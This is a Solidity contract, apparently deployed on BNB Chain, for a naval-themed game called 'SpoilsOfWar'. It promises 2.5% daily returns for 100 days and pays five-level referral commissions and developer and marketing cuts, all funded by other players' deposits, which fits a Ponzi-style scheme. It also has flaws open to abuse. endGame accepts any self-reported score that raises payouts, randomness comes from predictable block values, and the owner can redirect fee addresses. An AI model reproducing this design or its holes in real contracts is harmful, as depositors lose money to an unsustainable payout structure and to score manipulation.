/**
 *Submitted for verification at BscScan.com on 2022-09-23
*/

// SPDX-License-Identifier: MIT License
pragma solidity 0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
      address msgSender = _msgSender();
      _owner = msgSender;
      emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
      return _owner;
    }
    
    modifier onlyOwner() {
      require(_owner == _msgSender(), "Ownable: caller is not the owner");
      _;
    }

    function renounceOwnership() public onlyOwner {
      emit OwnershipTransferred(_owner, address(0));
      _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
      _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
      require(newOwner != address(0), "Ownable: new owner is the zero address");
      emit OwnershipTransferred(_owner, newOwner);
      _owner = newOwner;
    }
}

contract SpoilsOfWar is Context, Ownable {
    using SafeMath for uint256;
		
	event _SignUp(address indexed addr, uint256 amount, uint40 time, uint8 fleet, uint8 category);
    event _UpgradeFleet(address indexed addr, uint256 amount, uint40 time, uint8 fleet, uint8 category);
    event Payout(address indexed addr, uint256 amount);
	event SwitchFleet(address indexed addr, uint256 amount, uint40 time, uint8 fleet);
    
    address payable public dev;  
    address payable public mkg;        
    uint16 constant PERCENT = 100; 
    uint16[5] private ref_bonuses = [10, 5, 3, 2, 1]; 
    uint256 public investments;
    uint256 public rewards;
    uint256 public withdrawn;
    
    struct Downline {
        uint8 level;    
        address invite;
    }

    struct Tarif {
        uint256 life_days;
        uint256 percent;
    }

    struct Deposit {
        uint256 tarif;
        uint256 amount;
        uint40 time;
    }

    struct Battle {
        uint256 rewards;
		uint40 timeStart;
        uint40 timeEnd;
        uint8 result;
        uint8 status;		
    }

    struct Player {
        address upline;
        uint8 fleet; 
        uint256 total_deposit;
        uint256 total_withdrawn;
        uint256 total_rewards;         
        uint256 total_battle_score;

        uint40 lastWithdrawn;
        uint40 lastSwitched;
        
        Deposit[] deposits;
        Battle[] battles;
        Downline[] downlines1;
        Downline[] downlines2;
        Downline[] downlines3;
        Downline[] downlines4;
        Downline[] downlines5;        
        uint256[5] structure;         
    }

    mapping(address => Player) public players;
    mapping(uint256 => Tarif) public tarifs;

    uint256 public nextMemberNo;
		
	uint256 private constant DAY = 24 hours;
    uint256 private numDays = 1;    
	uint8 public isScheduled = 0;
    uint8 public isDaily = 1;
    
    uint256[2] public fleet_bnb         = [0, 0];
    uint256[2] public fleet_crews 	    = [3000, 3000];
    uint256[2] public fleet_ships 		= [0, 0]; 
    uint256[2] public fleet_aircrafts 	= [0, 0]; 
    uint256[2] public fleet_battles 	= [0, 0]; 
    uint256[2] public battles_rewards 	= [0, 0]; 
	   	
    constructor() {	    
    	dev = payable(msg.sender);		
        mkg = payable(msg.sender);		
		tarifs[100]  = Tarif(100, 250);		
    }    
	
	function signUp(address referral, uint8 fleet, uint8 category) public payable {
        require(msg.value >= 0.02 ether, "Minimum amount to sail is 0.02 BNB!");

        Player storage player = players[msg.sender];
        require(player.fleet == 0, "Already in the navy!");

        player.fleet = fleet;
        setUpline(msg.sender, referral, player.fleet);
            
		player.deposits.push(Deposit({
            tarif: 100, //by default, 2.5% daily for 100 days
            amount: msg.value,
            time: uint40(block.timestamp)
        }));  
        
        player.total_deposit += msg.value;        
        investments += msg.value;
		
		if(category == 2){
			fleet_aircrafts[player.fleet-1] += SafeMath.div(msg.value, 0.015 ether);
		}else{
			fleet_ships[player.fleet-1] += SafeMath.div(msg.value, 0.02 ether);
		}
		
	    fleet_bnb[player.fleet-1] += msg.value;
        
		devSupport(msg.value,5);     
		commissionPayouts(msg.sender, msg.value);
		
		emit _SignUp(msg.sender, msg.value, uint40(block.timestamp), fleet, category);		
    }
	
	
    function upgradeFleet(uint8 category) public payable {
        require(msg.value >= 0.03 ether, "Minimum amount is 0.03 BNB!");

        Player storage player = players[msg.sender];
            
		player.deposits.push(Deposit({
            tarif: 100, //by default, 2.5% daily for 100 days
            amount: msg.value,
            time: uint40(block.timestamp)
        }));  
        
        player.total_deposit += msg.value;        
        investments += msg.value;
		
		if(category == 2){
			fleet_aircrafts[player.fleet-1] += SafeMath.div(msg.value, 0.015 ether);
		}else{
			fleet_ships[player.fleet-1] += SafeMath.div(msg.value, 0.02 ether);
		}
		
	    fleet_bnb[player.fleet-1] += msg.value;
        
		devSupport(msg.value,5);     
		commissionPayouts(msg.sender, msg.value);
		
		emit _UpgradeFleet(msg.sender, msg.value, uint40(block.timestamp), player.fleet, category);		
    }

		
	function setUpline(address _addr, address _upline, uint8 fleet) private {
        if(players[_addr].upline == address(0) && _addr != owner()) {     

            if(players[_upline].total_deposit <= 0) {
				_upline = owner();
            }
			
			nextMemberNo++;
            fleet_crews[fleet-1]++;
			
            players[_addr].upline = _upline;
            
            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;
				Player storage up = players[_upline];
                if(i == 0){
                    up.downlines1.push(Downline({
                        level: i+1,
                        invite: _addr
                    }));  
                }else if(i == 1){
                    up.downlines2.push(Downline({
                        level: i+1,
                        invite: _addr
                    }));  
                }else if(i == 2){
                    up.downlines3.push(Downline({
                        level: i+1,
                        invite: _addr
                    }));  
                }else if(i == 3){
                    up.downlines4.push(Downline({
                        level: i+1,
                        invite: _addr
                    }));  
                }
                else{
                    up.downlines5.push(Downline({
                        level: i+1,
                        invite: _addr
                    }));      
                }
                _upline = players[_upline].upline;
                if(_upline == address(0)) break;
            }
        }
    }   
    

    function collectSpoils() external {
        Player storage player = players[msg.sender];
        
		if(isScheduled == 1) {
            require (block.timestamp >= (player.lastWithdrawn + (DAY * numDays)), "Not due yet to collect spoils!");
        }     
        uint256 payout = this.computePayout(msg.sender);
        if(payout > 0) {             
			players[msg.sender].lastWithdrawn = uint40(block.timestamp);			
            
            payable(msg.sender).transfer(payout); 			
			
            devSupport(payout,25);     
		    mkgSupport(payout,5);     
            
            player.total_withdrawn += payout;
			withdrawn += payout;         
			
		    emit Payout(msg.sender, payout);
		}
    }


    function switchAllegiance(uint8 fleet) public payable {
        require(msg.value >= 0.03 ether, "Minimum amount to switch fleet is 0.03 BNB!");
        
        Player storage player = players[msg.sender];
        require (block.timestamp >= (player.lastSwitched + DAY), "Can only switch fleet after 24 hrs since your last!");
        
        if(fleet_crews[player.fleet-1] >=1){
            fleet_crews[player.fleet-1]--;
        }
        
        player.fleet = fleet;
		fleet_crews[player.fleet-1]++;        
        fleet_ships[player.fleet-1] += SafeMath.div(msg.value, 0.02 ether);
	
        devSupport(msg.value,5);     
		mkgSupport(msg.value,5);     

        player.total_deposit += msg.value;        
        investments += msg.value;
		fleet_bnb[player.fleet-1] += msg.value;
		
        commissionPayouts(msg.sender, msg.value);

        player.lastSwitched = uint40(block.timestamp);
		
		player.deposits.push(Deposit({
            tarif: 100,
            amount: msg.value,
            time: uint40(block.timestamp)
        }));  
        emit SwitchFleet(msg.sender, msg.value, uint40(block.timestamp), fleet);		
    }
	

	function startGame() external {
        Player storage player = players[msg.sender];		
		player.battles.push(Battle({
            timeStart: uint40(block.timestamp),
            timeEnd: 0,
			rewards: 0,
			result: uint8(rand(100)),
			status: 0
		}));  				
	}
	
	
	function endGame(uint256 report, uint256 score) external {
		Player storage player = players[msg.sender];
		
		if(player.battles.length >= 1) {
			uint256 len = player.battles.length-1;
			if(player.battles[len].status==0 && score < 3000 ether)
			{			
                player.battles[len].timeEnd = uint40(block.timestamp);
				player.battles[len].status = 1;				
				if(player.battles[len].result > 30 && report>0){
					player.battles[len].rewards = score;
                    battles_rewards[player.fleet-1] += score; 
                    player.total_battle_score += score;
				}
				fleet_battles[player.fleet-1]++;				
			}
		}
        
	}


    function devSupport(uint256 amount, uint256 perc) private {
        uint256 support = SafeMath.div(SafeMath.mul(amount, perc), 100);
        payable(dev).transfer(support); 
        withdrawn += support;          
    }
    	
	function mkgSupport(uint256 amount, uint256 perc) private {
        uint256 support = SafeMath.div(SafeMath.mul(amount, perc), 100);
        payable(mkg).transfer(support); 
        withdrawn += support;          
    }
        
    
	function commissionPayouts(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;
            
            uint256 bonus = _amount * ref_bonuses[i] / PERCENT;
            payable(up).transfer(bonus); 
            players[up].total_rewards += bonus;

            rewards += bonus;
            withdrawn += bonus;
			     
            up = players[up].upline;
        }
    }   
    
    
    function computePayout(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];
        uint8 winning = this.whosWinning();
		uint256 levelno = SafeMath.div(player.downlines1.length+player.downlines2.length,300) + SafeMath.div(player.total_battle_score, 200000 ether);			
		for(uint256 i = 0; i < player.deposits.length; i++) {
            Deposit storage dep = player.deposits[i];
            Tarif storage tarif = tarifs[dep.tarif];

            uint256 time_end = dep.time + tarif.life_days * 86400;
            uint40 from;
            
            if(player.lastWithdrawn > player.lastSwitched){
                from = player.lastWithdrawn > dep.time ? player.lastWithdrawn : dep.time;
            }else{
                from = player.lastSwitched > dep.time ? player.lastSwitched : dep.time;
            }
            uint256 to = block.timestamp > time_end ? time_end : block.timestamp;

            if(from < to) {
				
				if(winning == 0){
					value += dep.amount * (to - from) * ((tarif.percent / tarif.life_days) + levelno) / 8640000;	
				}else if(winning == player.fleet){
			        value += dep.amount * (to - from) * ((300 / tarif.life_days) + levelno) / 8640000;	
				}else{
			        value += dep.amount * (to - from) * (200 / tarif.life_days) / 8640000;	
				}				
               
            }		
        }
        return value;
    }


    function playerLevel(address _addr) view external returns(uint256 level) {
		Player storage player = players[_addr];
        return( (SafeMath.div(player.downlines1.length+player.downlines2.length,300) + SafeMath.div(player.total_battle_score, 210000 ether)) + 1);
	}
	

    function playerInfo(address _addr) view external returns(uint256 myspoils, 
															uint256 mydeposits, 
															uint256 mygames, 
															uint8 gamestatus, 
															uint256 score, 
															uint256 downlines1,         
															uint256 downlines2,
                                                            uint256 downlines3,  
                                                            uint256 downlines4,  
                                                            uint256 downlines5,  
															uint256[5] memory structure) {       
        Player storage player = players[_addr];
        uint256 spoils = this.computePayout(_addr);
        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            structure[i] = player.structure[i];
        }
       
		uint8 gstatus = 0;
		if(player.battles.length >= 1) {
			gstatus = player.battles[player.battles.length-1].result;		
		}
        return (spoils, 
				player.deposits.length, 
				player.battles.length, 
				gstatus, 
				player.total_battle_score, 
				player.downlines1.length,
				player.downlines2.length,
				player.downlines3.length,
                player.downlines4.length,
                player.downlines5.length,
				structure);
    } 
    

    function memberDownline(address _addr, uint8 level, uint256 index) view external returns(address downline)
    {
        Player storage player = players[_addr];
        Downline storage dl;
        if(level==1){
            dl  = player.downlines1[index];
        }else if(level == 2)
        {
            dl  = player.downlines2[index];
        }else if(level == 3)
        {
            dl  = player.downlines3[index];
        }else if(level == 4)
        {
            dl  = player.downlines4[index];
        }        else{
            dl  = player.downlines5[index];
        }
        return(dl.invite);
    }


    function memberDeposit(address _addr, uint256 index) view external returns(uint40 time, uint256 amount, uint256 lifedays, uint256 percent)
    {
        Player storage player = players[_addr];
        Deposit storage dep = player.deposits[index];
        Tarif storage tarif = tarifs[dep.tarif];
        return(dep.time, dep.amount, tarif.life_days, tarif.percent);
    }
    

    function memberGame(address _addr, uint256 index)view external returns(uint40 timeStart, uint40 timeEnd, uint256 myrewards, uint256 result, uint8 status)
    {
        Player storage player = players[_addr];
        Battle storage bat = player.battles[index];
        return(bat.timeStart, bat.timeEnd, bat.rewards, bat.result, bat.status);
    }   
    

    function whosWinning() view external returns(uint8 winner) {
        uint256[2] memory percentages;
        
        uint256 mx2 = getHighest(fleet_ships[0], fleet_ships[1]);        
        percentages[0] += getPercentile(fleet_ships[0],mx2, 15); 
        percentages[1] += getPercentile(fleet_ships[1],mx2, 15); 
        
        uint256 mx4 = getHighest(fleet_aircrafts[0],fleet_aircrafts[1]);
        percentages[0] += getPercentile(fleet_aircrafts[0],mx4, 25); 
        percentages[1] += getPercentile(fleet_aircrafts[1],mx4, 25); 
        
        uint256 mx3 = getHighest(fleet_battles[0],fleet_battles[1]);
        percentages[0] += getPercentile(fleet_battles[0],mx3, 60); 
        percentages[1] += getPercentile(fleet_battles[1],mx3, 60);        
        
        if(percentages[0] > percentages[1]){
            return 1;
        }else if(percentages[0] < percentages[1]){
            return 2;
        }
		return 0;                
    }
    
    function getHighest(uint256 a, uint256 b) pure private returns(uint256 value) {        
        if(a >= b){
            return a;
        }else{
            return b;    
        }        
    }

    function getPercentile(uint256 a, uint256 h, uint256 p) pure private returns(uint256 value) {
        if(a == 0 || h == 0) { return 0; }
        return ((a / h * 100) * p) / 100;
    }   

    function rand(uint256 max) public view returns(uint256)
    {
        uint256 seed = uint256(keccak256(abi.encodePacked(
            block.timestamp + block.difficulty +
            ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (block.timestamp)) +
            block.gaslimit + 
            ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (block.timestamp)) +
            block.number
        )));
        return (seed - ((seed / max) * max));
    }

    function getBalance() public view returns(uint256) {
        return address(this).balance;
    }

    function setDev(address newval) public onlyOwner returns (bool success) {
        dev = payable(newval);
        return true;
    }  
 	
	function setMarketing(address newval) public onlyOwner returns (bool success) {
        mkg = payable(newval);
        return true;
    }  	

    function setScheduled(uint8 newval) public onlyOwner returns (bool success) {
        isScheduled = newval;
        return true;
    }   
   
    function setDays(uint newval) public onlyOwner returns (bool success) {
        numDays = newval;
        return true;
    }
    
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }

    function getOwner() external view returns (address) {
        return owner();
    }   
}


library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}